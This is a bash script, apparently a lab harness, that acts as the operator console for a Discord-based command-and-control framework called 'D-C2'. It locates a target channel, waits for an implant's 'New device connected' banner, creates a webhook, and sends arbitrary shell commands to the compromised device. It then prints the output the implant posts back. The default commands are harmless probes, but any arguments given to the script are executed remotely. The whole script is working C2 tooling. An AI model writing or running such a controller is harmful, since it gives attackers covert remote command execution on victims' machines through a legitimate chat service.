#!/usr/bin/env bash
# Operator simulator: sends commands to the D-C2 device channel via a webhook
# and prints the client's replies. Contains no credentials; reads /app/.env.
set -euo pipefail

if [[ -f /app/.env ]]; then
  set -a
  # shellcheck disable=SC1091
  . /app/.env
  set +a
fi

: "${DISCORD_BOT_TOKEN:?set DISCORD_BOT_TOKEN (env or /app/.env)}"
: "${DISCORD_GUILD_ID:?set DISCORD_GUILD_ID (env or /app/.env)}"

API="https://discord.com/api/v10"
CHANNEL_NAME="${DC2_CHANNEL_NAME:-dc2-target-operator}"
WAIT_SECONDS="${DC2_WAIT_SECONDS:-90}"
REPLY_TIMEOUT="${DC2_REPLY_TIMEOUT:-20}"

api() {
  curl -sS -H "Authorization: Bot ${DISCORD_BOT_TOKEN}" \
       -H "Content-Type: application/json" "$@"
}

echo "[attacker] waiting for #${CHANNEL_NAME} in guild ${DISCORD_GUILD_ID}"
channel_id=""
for _ in $(seq 1 "$WAIT_SECONDS"); do
  channel_id=$(api "${API}/guilds/${DISCORD_GUILD_ID}/channels" \
    | jq -r --arg n "$CHANNEL_NAME" '.[] | select(.type == 0 and .name == $n) | .id' \
    | head -1)
  [[ -n "$channel_id" ]] && break
  sleep 1
done
[[ -n "$channel_id" ]] || { echo "[attacker] channel not found"; exit 1; }
echo "[attacker] channel id: ${channel_id}"

# The channel may exist from a previous run, so wait for a fresh connection
# banner from this target before sending anything.
ready_after=$(( $(date +%s) - 30 ))
echo "[attacker] waiting for a fresh connection banner"
for _ in $(seq 1 "$WAIT_SECONDS"); do
  banner_ts=$(api "${API}/channels/${channel_id}/messages?limit=10" \
    | jq -r '[.[] | select(.author.bot == true and (.content | contains("New device connected"))) | .timestamp] | first // empty')
  if [[ -n "$banner_ts" ]]; then
    banner_epoch=$(date -d "$banner_ts" +%s 2>/dev/null || echo 0)
    [[ "$banner_epoch" -ge "$ready_after" ]] && break
  fi
  sleep 1
done

webhook_url=$(api "${API}/channels/${channel_id}/webhooks" | jq -r '.[0].url // empty')
if [[ -z "$webhook_url" ]]; then
  webhook_url=$(api -X POST "${API}/channels/${channel_id}/webhooks" \
    -d '{"name":"dc2-operator"}' | jq -r '.url // empty')
fi
[[ -n "$webhook_url" ]] || { echo "[attacker] could not create webhook"; exit 1; }
echo "[attacker] webhook ready"

# run_cmd <command> <expected substring>
run_cmd() {
  local command="$1" expect="$2" payload msg_id reply=""
  payload=$(jq -n --arg c "🏃‍♂️ ${command}" '{content: $c}')
  msg_id=$(curl -sS -H "Content-Type: application/json" -X POST "${webhook_url}?wait=true" \
    -d "$payload" | jq -r '.id // empty')
  [[ -n "$msg_id" ]] || { echo "[FAIL] ${command}: webhook post failed"; return 1; }

  for _ in $(seq 1 "$REPLY_TIMEOUT"); do
    sleep 1
    # Command output is posted asynchronously as a fenced block; the immediate
    # reply only carries the job ID.
    reply=$(api "${API}/channels/${channel_id}/messages?after=${msg_id}&limit=50" \
      | jq -r '[.[] | select(.author.bot == true) | select(.content | contains("```text")) | .content] | join("\n")')
    [[ -n "$reply" ]] && break
  done

  echo "----- ${command} -----"
  if [[ -z "$reply" ]]; then
    echo "[FAIL] no reply from client"
    return 1
  fi
  printf '%s\n' "$reply"

  if [[ -n "$expect" && "$reply" != *"$expect"* ]]; then
    echo "[FAIL] reply does not contain '${expect}'"
    return 1
  fi
  echo "[OK]"
  return 0
}

failures=0
commands=("$@")
if [[ ${#commands[@]} -eq 0 ]]; then
  commands=("echo dc2-lab-ok" "hostname" "id" "pwd")
fi

for c in "${commands[@]}"; do
  run_cmd "$c" "" || failures=$((failures + 1))
done

if [[ "$failures" -gt 0 ]]; then
  echo "[attacker] ${failures} command(s) failed"
  exit 1
fi
echo "[attacker] all commands succeeded"
